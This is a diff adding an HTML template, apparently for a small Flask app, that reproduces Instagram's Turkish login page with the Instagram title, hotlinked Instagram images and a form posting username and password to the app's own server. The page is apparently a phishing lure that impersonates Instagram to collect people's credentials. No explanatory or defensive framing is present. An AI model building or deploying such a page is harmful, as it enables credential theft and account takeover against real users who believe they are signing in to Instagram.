@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="phone-image">
+            <img src="https://www.instagram.com/static/images/homepage/home-phones.png/43cc71bb1b43.png" alt="Phone">
+        </div>
+        <div class="form-section">
+            <div class="login-box">
+                <h1 class="insta-logo">Instagram</h1>
+                <form method="post">
+                    <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                    <input type="password" name="password" placeholder="Şifre" required>
+                    <button type="submit">Giriş Yap</button>
+                </form>
+
+                <div class="divider">
+                    <div></div>
+                    <span>YA DA</span>
+                    <div></div>
+                </div>
+
+                <div class="facebook-login">Facebook ile Giriş Yap</div>
+                <div class="forgot-password">Şifreni mi unuttun?</div>
+            </div>
+
+            <div class="signup-box">
+                Hesabın yok mu? <a href="#">Kaydol</a>
+            </div>
+
+            <div class="get-app">
+                <p>Uygulamayı indir.</p>
+                <div class="store-links">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/y_/r/tUzYKZ-xrQK.png" alt="App Store">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yE/r/0lGM7s6yL_X.png" alt="Google Play">
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
